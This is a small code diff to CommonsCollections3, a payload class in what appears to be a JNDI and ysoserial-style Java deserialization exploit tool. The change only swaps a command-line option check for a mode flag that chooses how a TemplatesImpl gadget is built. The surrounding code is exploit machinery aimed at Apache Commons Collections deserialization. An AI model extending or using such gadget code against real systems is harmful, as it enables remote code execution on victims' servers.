@@ -19,6 +19,7 @@ import java.lang.reflect.InvocationHandler;
 import java.util.HashMap;
 import java.util.Map;
 
+import static com.qi4l.jndi.Starter.JYsoMode;
 import static com.qi4l.jndi.Starter.cmdLine;
 
 
@@ -34,7 +35,7 @@ public class CommonsCollections3 implements ObjectPayload<Object> {
 
     public Object getObject(PayloadType type, String... param) throws Exception {
         final Object templatesImpl;
-        if (!cmdLine.getOptionValue("ysoserial").isEmpty() && cmdLine.getOptionValue("ysoserial").equals("1")) {
+        if (JYsoMode.contains("yso")) {
             templatesImpl = GadgetsYso.createTemplatesImpl(param[0]);
         } else {
             templatesImpl = Gadgets.createTemplatesImpl(type, param);
